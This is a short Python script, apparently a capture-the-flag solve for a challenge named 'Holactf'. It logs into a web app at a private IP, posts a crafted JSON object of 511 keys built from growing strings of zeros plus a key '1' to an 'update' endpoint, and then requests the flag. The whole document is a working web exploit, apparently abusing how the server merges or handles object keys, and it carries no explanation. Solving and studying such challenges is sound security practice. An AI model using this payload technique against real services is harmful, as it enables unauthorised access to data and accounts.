import requests
url="http://172.18.49.27:5000/"
s = requests.Session()
data={
    "username": "proochicken"
}
login = s.post(url, data=data)

payload={}

for i in range(1, 512):
    payload["0"*(i+1)] = "proochicken"
payload["1"] = "Holactf"

endpoint = "update"
res = s.post(url+endpoint, json={"data":payload})

endpoint = "get_flag"
res = s.get(url+endpoint)
print(res.json())
